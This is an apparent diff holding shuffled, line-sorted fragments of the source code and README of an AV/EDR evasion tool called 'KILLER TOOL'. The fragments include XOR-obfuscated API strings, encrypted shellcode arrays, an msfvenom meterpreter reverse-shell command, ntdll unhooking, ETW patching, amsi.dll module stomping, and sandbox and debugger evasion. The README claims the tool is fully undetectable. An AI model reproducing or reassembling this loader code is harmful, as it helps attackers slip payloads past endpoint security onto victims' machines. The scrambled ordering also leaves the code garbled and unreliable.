@@ -1,0 +1,574 @@
+      
+        
+            print(hex(i 
+        // puting the comma after the byte then when go to last byte delete the comma
+        for (int i = 0
+        for i in data:
+        if (i != size-1) {
+        key  = 0x50 
+        shellcode[i] = temp
+        shellcode[size-i-1] = shellcode[i]
+        shellcode[size/2] = shellcode[size/2]
+        temp = shellcode[size-i-1]
+        }
+      // returning the DLL base address.
+      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<IP> LPORT<PORT> -f py
+      return (FARPROC)((BYTE
+      return (HMODULE)pEntry->DllBase
+     Author => Hossam Ehab / EDR/AV evasion tool
+    // Example shellcode array in 0x format
+    // Reverse the shellcode
+    // checking if this is the DLL we are looking for
+    // getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
+    LDR_DATA_TABLE_ENTRY
+    for (i = 0
+    for (int i = 0
+    https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c
+    if (size % 2 != 0) {
+    int i
+    int size = sizeof(shellcode)/sizeof(shellcode[0])
+    result = 1
+    return 0
+    unsigned char temp
+    }
+    } if (size % 2 != 0) { shellcode[size/2] = shellcode[size/2]
+  // Display error message
+  // PEB
+  // for x86
+  // iterating through the linked list.
+  // iterating to the next node. this will be our starting point.
+  // obtaining the address of the head node in a linked list 
+  // obtaining the offset of PPEB from the beginning of TEB
+  // the needed DLL wasn't found
+  // which represents all the models that are loaded into the process.
+  DWORD
+  LIST_ENTRY
+  PEB 
+  PEB_LDR_DATA
+  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule
+  PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE
+  PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE
+  WCHAR mystr[MAX_PATH] = { 0 }
+  WCHAR substr[MAX_PATH] = { 0 }
+  WORD
+  for (DWORD i = 0
+  for (LIST_ENTRY
+  int result = 0
+  nbHooks
+  ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
+  pCheckRemoteDebuggerPresentFunc 
+  return NULL
+  return result
+ ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER 
+ // 
+ // will be 1048576
+ //Ho7sAM3Eh0BA5lPQw2zXw3N
+ //plus null
+ 0 : ctr
+ API Unhooking
+ After finding .text section from DLL we are trying to resolve it's address 
+ Basic Anti-Debugging
+ Compile the code with visual studio compiler
+ DLL Unhooking by fresh ntdll copy
+ Declare function pointers 
+ ETW Patching - Run payload without create a new thread
+ ETW Patchnig for bypassing some security controls
+ Encrypted strings by xor to evade static stuff : 
+ Features:
+ First thanks to [Abdallah Mohammed](https://github.com/abdallah-elsharif) for helping me to develop it 
+ Fully obfuscated (Functions - Keys - Shellcode) by XOR-ing
+ Function to reverse a shellcode array in 0x format 
+ GetCurrentProcessFunc)()
+ GetModuleHandle Implementation by @cocomelonc
+ GetProcAddress 
+ GlobalMemoryStatusExFunc)( LPMEMORYSTATUSEX lpBuffer)
+ How to use it
+ IAT Hiding and Obfuscation 
+ Important Notes
+ Included sandbox evasion techniques 
+ KEY
+ KILLER TOOL (EDR Evasion)
+ Ldr = pPeb->Ldr
+ Load system functions 
+ MSDN APIs
+ Module Stomping for Memory scanning evasion
+ ModuleList = 
+ Moving payload into hallowed memory without using APIs 
+ Part 1 => https://medium.com/@0xHossam/av-edr-evasion-malware-development-933e50f47af5
+ Part 2 => https://medium.com/@0xHossam/av-edr-evasion-malware-development-p2-7a947f7db354
+ Part 3 => https://medium.com/@0xHossam/unhooking-memory-object-hiding-3229b75618f7
+ Part 4 => https://medium.com/@0xHossam/av-edr-evasion-malware-development-p-4-162662bb630e
+ PoC (Proof-of-Concept) :
+ Put here your key as byte like for example (0x90 or 0x40 or 0x30) and more...
+ Runs without creating new thread 
+ Shellcode reversed and Encrypted
+ Suppoers x64 and x86 arch
+ The tool is for educational purposes only
+ Then copy the output into the encryptor XOR function :
+ addressOfFunctions = (DWORD
+ addressOfFunctions[addressOfNameOrdinals[i]])
+ addressOfNameOrdinals = (WORD
+ addressOfNames = (DWORD
+ addressOfNames[i]) == 0) {
+ argv) {
+ bTrap) { return EXIT_FAILURE
+ cApi[i] != KEY)
+ decKey[ctr
+ dosHeader->e_lfanew)
+ etwAddr_bk = etwAddr
+ exportDirectory->AddressOfFunctions)
+ exportDirectory->AddressOfNameOrdinals)
+ exportDirectory->AddressOfNames)
+ funcPtr()
+ hookedDosHeader->e_lfanew)
+ i < 4
+ i < exportDirectory->NumberOfNames
+ i < hookedNtHeader->FileHeader.NumberOfSections
+ i < nSize
+ i < size
+ i < size/2
+ i < sizeof(shellcode)
+ i))
+ idx
+ idx < nMemAlloc
+ idx < shellcode_len
+ index
+ nbHooks
+ pCreateFileAFunc 
+ pCreateFileMappingAFunc 
+ pDosHeader->e_lfanew)
+ pEnctyptedShell)
+ pEntry = (LDR_DATA_TABLE_ENTRY
+ pGetCurrentProcessFunc 
+ pGlobalMemoryStatusExFunc 
+ pHollowedDLL
+ pListEntry != ModuleList
+ pListEntry = pListEntry->Flink) {
+ pListEntry = pStartListEntry
+ pMapViewOfFileFunc)) {
+ pMem
+ pPeb = (PEB
+ pPeb = (PEB 
+ pSection->VirtualAddress)
+ pStartListEntry = ModuleList->Flink
+ return -2
+ sizeof(WCHAR))
+ } else {
+ } else { return FALSE
+![image](https://user-images.githubusercontent.com/82971998/230731975-a70abd1c-279b-4e79-9e91-6b5212b7db9a.png)
+![image](https://user-images.githubusercontent.com/82971998/230732045-ca2638fe-4f3c-4926-8f94-4fff817ca585.png)
+"                } else { PRINT_SUCCESS("" NtCreateThreadEx Not Hooked"")"
+"            printf("", "")"
+"        //printf("""
+"        data = b"""
+"        print(""0x0 }"
+"        print('{ ', end='')"
+"        printf(""0x%02x"", (unsigned char)shellcode[i])"
+"        printf(""0x%02x"", shellcode[i])"
+"    if (cmpUnicodeStr(substr, mystr)) {"
+"    if (strcmp(lpProcName, (const char"
+"    memset(mystr, 0, MAX_PATH "
+"    memset(substr, 0, MAX_PATH "
+"    printf("""
+"    printf(""Original shellcode in hex format:"
+"    reverseShellcode(pHollowedDLL, sizeof(shellcode))"
+"    reverseShellcode(shellcode, size)"
+"    unsigned char shellcode[] = {0xb4, 0x27, 0xb4, 0x97, 0xb1, 0xa5, 0xf3, 0x45, 0x68, 0x30, 0x3, 0x10, 0x74, 0x3c, 0x2, 0x0, 0x21, 0x7a, 0x4b, 0x8a, 0x12, 0x7b, 0xc5, 0x1a, 0xf, 0x7f, 0xf8, 0x13, 0x55, 0x7b, 0xce, 0x3a, 0x10, 0xa, 0xca, 0x47, 0x3c, 0x18, 0x5e, 0xc0, 0x78, 0x30, 0x15, 0x46, 0xfa, 0x6, 0x79, 0xaf, 0x9b, 0x4f, 0x20, 0x31, 0x31, 0x69, 0x48, 0x71, 0x83, 0x88, 0x38, 0x2d, 0x51, 0x90, 0x95, 0xdf, 0x28, 0x19, 0x26, 0x7b, 0xc5, 0x1a, 0x4f, 0xbc, 0x31, 0x7d, 0x5, 0x32, 0x95, 0xe3, 0xb0, 0xca, 0x41, 0x35, 0x6c, 0x18, 0xd4, 0xb7, 0x46, 0x1d, 0x10, 0x76, 0xe3, 0x1e, 0xc3, 0x27, 0x2f, 0x37, 0xca, 0xd, 0x13, 0xc, 0x69, 0xe0, 0xa1, 0x17, 0x7d, 0x93, 0x99, 0x10, 0xfc, 0x6, 0xf2, 0x10, 0x76, 0xe5, 0x3, 0x79, 0xa6, 0x7f, 0x42, 0x81, 0xe1, 0x72, 0x84, 0xa1, 0x3d, 0x3, 0x40, 0xf4, 0x54, 0xb0, 0x24, 0x86, 0x7e, 0x79, 0x14, 0x53, 0x3b, 0xb, 0x71, 0xbe, 0x42, 0xab, 0x19, 0x9, 0xb8, 0x5, 0x4c, 0x79, 0x43, 0x91, 0x53, 0x2d, 0xdb, 0x5d, 0x3f, 0x76, 0xf1, 0x18, 0x6b, 0x7a, 0x4f, 0x98, 0x2e, 0xbc, 0x77, 0xc9, 0x5, 0x32, 0x95, 0x29, 0x68, 0x3, 0x19, 0x6b, 0x35, 0xa, 0x10, 0x2f, 0x73, 0x23, 0x19, 0x2d, 0x7b, 0xcd, 0xa4, 0x4f, 0x76, 0x21, 0xbe, 0xad, 0x6b, 0x4, 0x31, 0x6a, 0xa, 0xca, 0x27, 0x85, 0x7, 0xae, 0x88, 0xcd, 0x27, 0x10, 0xcd, 0x32, 0x4e, 0x48, 0x6f, 0x37, 0x73, 0x41, 0x4d, 0x7b, 0xc8, 0xe5, 0x31, 0x43, 0x41, 0x35, 0x2d, 0xea, 0x60, 0xfc, 0x5d, 0xfd, 0xa7, 0xa2, 0x88, 0xbe, 0xfd, 0xcd, 0x61, 0x32, 0xfb, 0xeb, 0xa6, 0xf8, 0xf5, 0xcf, 0x97, 0x9, 0xb6, 0xa8, 0x78, 0x6d, 0x71, 0x4e, 0x70, 0xd8, 0x8c, 0xd3, 0x3b, 0x4d, 0xd4, 0x70, 0x60, 0x33, 0x22, 0x59, 0x45, 0x31, 0x71, 0xcb, 0x9b, 0xca, 0xb9, 0x33, 0x30, 0x1b, 0x51, 0x54, 0x3d, 0xf, 0x56, 0x4e}"
+"    wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer)"
+"    wcscpy_s(substr, MAX_PATH, lModuleName)"
+"   } else { PRINT_SUCCESS("" NtQueryInformationThread Not Hooked"
+"  PRINT_ERROR(""failed to get a handle to %s"
+"  _wcslwr_s(mystr, MAX_PATH)"
+"  _wcslwr_s(substr, MAX_PATH)"
+"  if (StrStrW(mystr, substr) != NULL) {"
+" (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress "
+" (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize)"
+" (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, "
+" (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, "
+" // decrypt ""amsi.dll"""
+" // decrypt ""kernel32.dll"""
+" CheckRemoteDebuggerPresentFunc)( HANDLE hProcess, PBOOL  pbDebuggerPresent )"
+" Checking the file name is a sandbox evasion technique - if the filename isn't killer.exe will exit - it will check from the terminal argument ""argv"" "
+" CreateFileAFunc)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)"
+" CreateFileMappingAFunc)( HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName )"
+" MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0)"
+" MapViewOfFileFunc)(HANDLE hFileMappingObject, DWORD  dwDesiredAccess, DWORD  dwFileOffsetHigh, DWORD  dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap)"
+" Notice that it adds one byte ""0x0"" to the end."
+" Response) Evasion Tool "" NC BOLD fmt NL NC, __VA_ARGS__)"
+" SEC_IMAGE, 0, 0, NULL)"
+" VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD)"
+" cApi, int nSize)"
+" etwAddr = myGetProcAddr(myGetModuleHandle(wNtdll), cEtwEventWrite)"
+" key Decrypted after stomping, Shellcode length: %d"", sizeof(shellcode))"
+" key), end=', ')"
+" pVirtualAllocExNuma) ( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nndPreferred )"
+" the .text section doesn't have Write permission, so we changes protection to RW and later before exection we will restore again to RX "
+" uNtAllocateVirtualMemory)(HANDLE, PVOID, ULONG, SIZE_T, ULONG, ULONG)"
+" uNtCreateThreadEx) (OUT PHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN SIZE_T StackZeroBits, IN SIZE_T SizeOfStackCommit, IN SIZE_T SizeOfStackReserve, OUT PVOID lpBytesBuffer)"
+" uNtProtectVirtualMemory) (HANDLE, IN OUT PVOID"
+" uNtQueryInformationThread) (IN HANDLE ThreadHandle, IN THREADINFOCLASS ThreadInformationClass, OUT PVOID ThreadInformation, IN ULONG ThreadInformationLength, OUT PULONG         ReturnLength)"
+" uNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG)"
+" }   else { PRINT_SUCCESS("" NtAllocateVirtualMemory Not Hooked"
+" }   else { PRINT_SUCCESS("" NtCreateThreadEx Not Hooked"
+" } else { PRINT_SUCCESS("" NtAllocateVirtualMemory Not Hooked"")"
+" } else { PRINT_SUCCESS("" NtProtectVirtualMemory Not Hooked"")"
+" } else { PRINT_SUCCESST(""Debugger is not attach"")"
+"','S','y','s','t','e','m','3','2','"
+"','W','i','n','d','o','w','s','"
+"','n','t','d','l','l','.','d','l','l',0 }"
+")hookedSectionHeader->Name, (char"
+")pSection->Name, "".text"", 5) != 0)"
+", IN OUT PSIZE_T, IN ULONG, OUT PULONG)"
+", you can read more about it in my articale : "
+"033[0m"""
+"033[1m"""
+"31m"""
+"32m"""
+"34m"""
+"And then you can handle your decryption function, It's not easy for script kiddies "
+"BOOL success = EnumSystemLocalesA((LOCALE_ENUMPROCA)pHollowedDLL, LCID_SUPPORTED)"
+"BYTE stub[] = """
+"Copy ntdll to a fresh memory alloc and overwrite calls adresses, you can read about it from here :"
+"FARPROC myGetProcAddr(HMODULE hModule, LPCSTR lpProcName) {"
+"GetConsoleMode(hOut, "
+"GetModuleInformation(process, ntdllModule, "
+"HANDLE ntdllFile = pCreateFileAFunc(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)"
+"HANDLE ntdllMapping = pCreateFileMappingAFunc(ntdllFile, NULL, PAGE_READONLY "
+"HMODULE hAMSI, hModule"
+"If the bytes match, the function returns FALSE. If the bytes do not match, the function prints a message indicating that the first bytes are ""HOOKED"" and returns TRUE."
+"It's a AV/EDR Evasion tool created to bypass security tools for learning, until now the tool is FUD."
+"LPVOID ntdllMappingAddress = pMapViewOfFileFunc(ntdllMapping, FILE_MAP_READ, 0, 0, 0)"
+"NtProtectVirtualMemory(pGetCurrentProcessFunc(), (PVOID"
+"NtWriteVirtualMemory(pGetCurrentProcessFunc(), (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (PULONG)nullptr)"
+"PATCH ETW : is technique used for bypassing some security controls, If you want to read about it see this from ired.team :"
+"PRINT_ERROR("""
+"PRINT_ERROR(""Failed to converting protection to RW (%u)"
+"PRINT_ERROR(""Failed to load required system functions."")"
+"PRINT_ERROR(""Sandbox detected - Filename changed :( "
+"PRINT_ERROR(""The nonexistent file is detected !!! trying to exit"")"
+"PRINT_STATUS("" (different from "")"
+"PRINT_STATUS(""Copy ntdll to a fresh memory allocation and overwrite calls adresses, Detecting ntdll hooking : "
+"PRINT_STATUS(""ETW patched !"")"
+"PRINT_STATUS(""Restoring RX permission again"")"
+"PRINT_STATUS(""Try to find .text section, sec name %s"", (const char"
+"PRINT_STATUS(""amsi.dll .text address = 0x%p"", pHollowedDLL)"
+"PRINT_SUCCESS(""NtQueryInformationThread Not Hooked"
+"PRINT_SUCCESST(""Hit enter to run shellcode/payload without creating a new thread"")"
+"PRINT_SUCCESST(""Patching ETW 'Event Tracing for Windows' writer"")"
+"PRINT_SUCCESST(""Sandbox rounds finished no sandbox detected "
+"PRINT_SUCCESST(""Shellcode "
+"PRINT_SUCCESST(""converting protection to RW in ntdll"")"
+"PRINT_SUCCESST(""moving the payload to the hollowed memory without using an APIs"")"
+"RtlMoveMemory(pHollowedDLL, shellcode, sizeof(shellcode))"
+"SetConsoleMode(hOut, dwMode)"
+"] "" NC BOLD fmt NL NC, __VA_ARGS__)"
+"]"" NC BOLD fmt NL NC, __VA_ARGS__)"
+"char b[] = { 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xe6, 0xc4, 0xd9, 0xc2, 0xd3, 0xd5, 0xc2, 0x0 }"
+"char cAmsi[] = { 0xd7, 0xdb, 0xc5, 0xdf, 0x98, 0xd2, 0xda, 0xda, 0x0 }"
+"char cCheckGlobalMemory[] = { 0xf1, 0xda, 0xd9, 0xd4, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0xe5, 0xc2, 0xd7, 0xc2, 0xc3, 0xc5, 0xf3, 0xce, 0x0 }"
+"char cCheckRemote[] = { 0xf5, 0xde, 0xd3, 0xd5, 0xdd, 0xe4, 0xd3, 0xdb, 0xd9, 0xc2, 0xd3, 0xf2, 0xd3, 0xd4, 0xc3, 0xd1, 0xd1, 0xd3, 0xc4, 0xe6, 0xc4, 0xd3, 0xc5, 0xd3, 0xd8, 0xc2, 0x0 }"
+"char cCreateFileA[] = { 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xf0, 0xdf, 0xda, 0xd3, 0xf7, 0x0 }"
+"char cCreateFileMapping[] = { 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xf0, 0xdf, 0xda, 0xd3, 0xfb, 0xd7, 0xc6, 0xc6, 0xdf, 0xd8, 0xd1, 0xf7, 0x0 }"
+"char cEtwEventWrite[] = { 0xf3, 0xc2, 0xc1, 0xf3, 0xc0, 0xd3, 0xd8, 0xc2, 0xe1, 0xc4, 0xdf, 0xc2, 0xd3, 0x0 }"
+"char cGetCurrentProcess[] = { 0xf1, 0xd3, 0xc2, 0xf5, 0xc3, 0xc4, 0xc4, 0xd3, 0xd8, 0xc2, 0xe6, 0xc4, 0xd9, 0xd5, 0xd3, 0xc5, 0xc5, 0x0 }"
+"char cLib2Name[] = { 0xdd, 0xd3, 0xc4, 0xd8, 0xd3, 0xda, 0x85, 0x84, 0x98, 0xd2, 0xda, 0xda, 0x0 }"
+"char cMapViewOfFile[] = { 0xfb, 0xd7, 0xc6, 0xe0, 0xdf, 0xd3, 0xc1, 0xf9, 0xd0, 0xf0, 0xdf, 0xda, 0xd3, 0x0 }"
+"char cNtAllocateVirtualMemory[] = { 0xf8, 0xc2, 0xf7, 0xda, 0xda, 0xd9, 0xd5, 0xd7, 0xc2, 0xd3, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 }"
+"char cNtCreateThreadEx[] = { 0xf8, 0xc2, 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xe2, 0xde, 0xc4, 0xd3, 0xd7, 0xd2, 0xf3, 0xce, 0x0 }"
+"char cNtProtectVirtualMemory[] = { 0xf8, 0xc2, 0xe6, 0xc4, 0xd9, 0xc2, 0xd3, 0xd5, 0xc2, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 }"
+"char cNtQueryInformationThread[] = { 0xf8, 0xc2, 0xe7, 0xc3, 0xd3, 0xc4, 0xcf, 0xff, 0xd8, 0xd0, 0xd9, 0xc4, 0xdb, 0xd7, 0xc2, 0xdf, 0xd9, 0xd8, 0xe2, 0xde, 0xc4, 0xd3, 0xd7, 0xd2, 0x0 }"
+"char cNtWriteVirtualMemory[] = { 0xf8, 0xc2, 0xe1, 0xc4, 0xdf, 0xc2, 0xd3, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 }"
+"char cNtdll[] = { 0xd8, 0xc2, 0xd2, 0xda, 0xda, 0x98, 0xd2, 0xda, 0xda, 0x0 }"
+"char cVirtualAllocExNuma[] = { 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xf7, 0xda, 0xda, 0xd9, 0xd5, 0xf3, 0xce, 0xf8, 0xc3, 0xdb, 0xd7, 0x0 }"
+"char decKey[] = { 0xfe, 0xd9, 0x81, 0xc5, 0xf7, 0xfb, 0x85, 0xf3, 0xde, 0x86, 0xf4, 0xf7, 0x83, 0xda, 0xe6, 0xe7, 0xc1, 0x84, 0xcc, 0xee, 0xc1, 0x85, 0xf8, 0x0 }"
+"char path[] = { 'C',':','"
+"char sntdll[] = { '.','t','e','x','t',0 }"
+"deObfuscate(b, SIZEOF(b))"
+"deObfuscate(cAmsi, SIZEOF(cAmsi))"
+"deObfuscate(cCheckGlobalMemory, SIZEOF(cCheckGlobalMemory))"
+"deObfuscate(cCheckRemote, SIZEOF(cCheckRemote))"
+"deObfuscate(cCreateFileA, SIZEOF(cCreateFileA))"
+"deObfuscate(cCreateFileMapping, SIZEOF(cCreateFileMapping))"
+"deObfuscate(cEtwEventWrite, SIZEOF(cEtwEventWrite))"
+"deObfuscate(cGetCurrentProcess, SIZEOF(cGetCurrentProcess))"
+"deObfuscate(cLib2Name, SIZEOF(cLib2Name))"
+"deObfuscate(cMapViewOfFile, SIZEOF(cMapViewOfFile))"
+"deObfuscate(cNtAllocateVirtualMemory, SIZEOF(cNtAllocateVirtualMemory))"
+"deObfuscate(cNtCreateThreadEx, SIZEOF(cNtCreateThreadEx))"
+"deObfuscate(cNtProtectVirtualMemory, SIZEOF(cNtProtectVirtualMemory))"
+"deObfuscate(cNtQueryInformationThread, SIZEOF(cNtQueryInformationThread))"
+"deObfuscate(cNtWriteVirtualMemory, SIZEOF(cNtWriteVirtualMemory))"
+"deObfuscate(cNtdll, SIZEOF(cNtdll))"
+"deObfuscate(cVirtualAllocExNuma, SIZEOF(cVirtualAllocExNuma))"
+"deObfuscate(decKey, SIZEOF(decKey))"
+"define BLUE """
+"define BOLD """
+"define BR(fmt, ...) printf("""
+"define GREEN """
+"define NC """
+"define NL """
+"define PRINT_ERROR(fmt, ...) printf("""
+"define PRINT_STATUS(fmt, ...) printf(BLUE "" ["
+"define PRINT_SUCCESS(fmt, ...) printf("""
+"define PRINT_SUCCESST(fmt, ...) printf(GREEN "" ["
+"define RED """
+"etwAddr_bk, (PSIZE_T)"
+"for (int idx = 0, ctr = 0"
+"if (!VirtualProtect(pHollowedDLL, 4096, PAGE_READWRITE, "
+"if (!VirtualProtect(pHollowedDLL, 4096, dwOldProtection, "
+"if (!pCheckRemoteDebuggerPresentFunc(pGetCurrentProcessFunc(), "
+"if (checkNUMA()) { PRINT_ERROR(""NUMA memory allocate failed :( "
+"if (checkResources() == false) {  PRINT_ERROR(""I got you sandbox, it's can't be run here :("
+"if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtAllocateVirtualMemory))) { PRINT_ERROR("" NtAllocateVirtualMemory Hooked"
+"if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtAllocateVirtualMemory))) { PRINT_ERROR("" NtAllocateVirtualMemory is Hooked"
+"if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtCreateThreadEx))) { PRINT_ERROR("" NtCreateThreadEx is Hooked"
+"if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtCreateThreadEx))) {PRINT_ERROR("" NtCreateThreadEx is Hooked"
+"if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtProtectVirtualMemory))) {  PRINT_ERROR("" NtProtectVirtualMemory is Hooked"
+"if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtProtectVirtualMemory))) { PRINT_ERROR("" NtProtectVirtualMemory Hooked"
+"if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtQueryInformationThread))) { PRINT_ERROR("" NtQueryInformationThread Hooked"
+"if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtQueryInformationThread))) {PRINT_ERROR("" NtQueryInformationThread Hooked"
+"if (memcmp(addr, stub, 4) != 0) {"
+"if (pCreateFileAFunc(cLib2Name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL) != INVALID_HANDLE_VALUE) "
+"if (strstr(argv[0], ""killer.exe"") == NULL) {"
+"int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { "
+"int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {"
+"int main(int argc, char"
+"int nMemAlloc, nCtr = 0"
+"mbstowcs(wtext, cNtdll, strlen(cNtdll)"
+"mbstowcs(wtk, cLib2Name, strlen(cLib2Name)"
+"mem = myVirtualAllocExNuma(pGetCurrentProcessFunc(), NULL, 1000, MEM_RESERVE "
+"memPage, 0x04, "
+"memPage, lpflOldProtect, "
+"mi, sizeof(mi))"
+"n"", GetLastError())"
+"n"", lModuleName)"
+"pCheckRemoteDebuggerPresentFunc = (CheckRemoteDebuggerPresentFunc)myGetProcAddr(hModuleK, cCheckRemote)"
+"pCreateFileAFunc = (CreateFileAFunc)myGetProcAddr(hModuleK, cCreateFileA)"
+"pCreateFileMappingAFunc = (CreateFileMappingAFunc)myGetProcAddr(hModuleK, cCreateFileMapping)"
+"pGetCurrentProcessFunc = (GetCurrentProcessFunc)myGetProcAddr(hModuleK, cGetCurrentProcess)"
+"pGlobalMemoryStatusExFunc = (GlobalMemoryStatusExFunc)myGetProcAddr(hModuleK, cCheckGlobalMemory)"
+"pMapViewOfFileFunc = (MapViewOfFileFunc)myGetProcAddr(hModuleK, cMapViewOfFile)"
+"pVirtualAllocExNuma myVirtualAllocExNuma = (pVirtualAllocExNuma)myGetProcAddr(GetModuleHandle(""kernel32.dll""), cVirtualAllocExNuma)"
+"pVirtualProtectFunc = (VirtualProtectFunc)myGetProcAddr(hModuleK, b)"
+"pragma comment(lib, ""Shlwapi.lib"")"
+"printf("""
+"printf("")"
+"printf(GREEN"""
+"printf(RED""   "
+"printf(RED"""
+"sets all the bytes in the allocated memory block to 0x00, and checks for errors."
+"shellcode, int size) {"
+"t"" GREEN "" ["
+"t"" RED "" [!] "" NC BOLD fmt NL NC, __VA_ARGS__)"
+"t"" RED "" [-] Author => Hossam Ehab / An EDR (End Point Detection "
+"tFirst bytes are HOOKED : "")"
+"uNtAllocateVirtualMemory NtAllocateVirtualMemory = (uNtAllocateVirtualMemory)myGetProcAddr(hNtdll, cNtAllocateVirtualMemory)"
+"uNtCreateThreadEx NtCreateThreadEx = (uNtCreateThreadEx)myGetProcAddr(hNtdll, cNtCreateThreadEx)"
+"uNtProtectVirtualMemory NtProtectVirtualMemory = (uNtProtectVirtualMemory)myGetProcAddr(hNtdll, cNtProtectVirtualMemory)"
+"uNtQueryInformationThread NtQueryInformationThread = (uNtQueryInformationThread)myGetProcAddr(hNtdll, cNtQueryInformationThread)"
+"uNtWriteVirtualMemory NtWriteVirtualMemory = (uNtWriteVirtualMemory)myGetProcAddr(hNtdll, cNtWriteVirtualMemory)"
+"unsigned char shellcode[] = { 0x4e, 0x56, 0x0f, 0x3d, 0x54, 0x51, 0x1b, 0x30, 0x33, 0xb9, 0xca, 0x9b, 0xcb, 0x71, 0x31, 0x45, 0x59, 0x22, 0x33, 0x60, 0x70, 0xd4, 0x4d, 0x3b, 0xd3, 0x8c, 0xd8, 0x70, 0x4e, 0x71, 0x6d, 0x78, 0xa8, 0xb6, 0x09, 0x97, 0xcf, 0xf5, 0xf8, 0xa6, 0xeb, 0xfb, 0x32, 0x61, 0xcd, 0xfd, 0xbe, 0x88, 0xa2, 0xa7, 0xfd, 0x5d, 0xfc, 0x60, 0xea, 0x2d, 0x35, 0x41, 0x43, 0x31, 0xe5, 0xc8, 0x7b, 0x4d, 0x41, 0x73, 0x37, 0x6f, 0x48, 0x4e, 0x32, 0xcd, 0x10, 0x27, 0xcd, 0x88, 0xae, 0x07, 0x85, 0x27, 0xca, 0x0a, 0x6a, 0x31, 0x04, 0x6b, 0xad, 0xbe, 0x21, 0x76, 0x4f, 0xa4, 0xcd, 0x7b, 0x2d, 0x19, 0x23, 0x73, 0x2f, 0x10, 0x0a, 0x35, 0x6b, 0x19, 0x03, 0x68, 0x29, 0x95, 0x32, 0x05, 0xc9, 0x77, 0xbc, 0x2e, 0x98, 0x4f, 0x7a, 0x6b, 0x18, 0xf1, 0x76, 0x3f, 0x5d, 0xdb, 0x2d, 0x53, 0x91, 0x43, 0x79, 0x4c, 0x05, 0xb8, 0x09, 0x19, 0xab, 0x42, 0xbe, 0x71, 0x0b, 0x3b, 0x53, 0x14, 0x79, 0x7e, 0x86, 0x24, 0xb0, 0x54, 0xf4, 0x40, 0x03, 0x3d, 0xa1, 0x84, 0x72, 0xe1, 0x81, 0x42, 0x7f, 0xa6, 0x79, 0x03, 0xe5, 0x76, 0x10, 0xf2, 0x06, 0xfc, 0x10, 0x99, 0x93, 0x7d, 0x17, 0xa1, 0xe0, 0x69, 0x0c, 0x13, 0x0d, 0xca, 0x37, 0x2f, 0x27, 0xc3, 0x1e, 0xe3, 0x76, 0x10, 0x1d, 0x46, 0xb7, 0xd4, 0x18, 0x6c, 0x35, 0x41, 0xca, 0xb0, 0xe3, 0x95, 0x32, 0x05, 0x7d, 0x31, 0xbc, 0x4f, 0x1a, 0xc5, 0x7b, 0x26, 0x19, 0x28, 0xdf, 0x95, 0x90, 0x51, 0x2d, 0x38, 0x88, 0x83, 0x71, 0x48, 0x69, 0x31, 0x31, 0x20, 0x4f, 0x9b, 0xaf, 0x79, 0x06, 0xfa, 0x46, 0x15, 0x30, 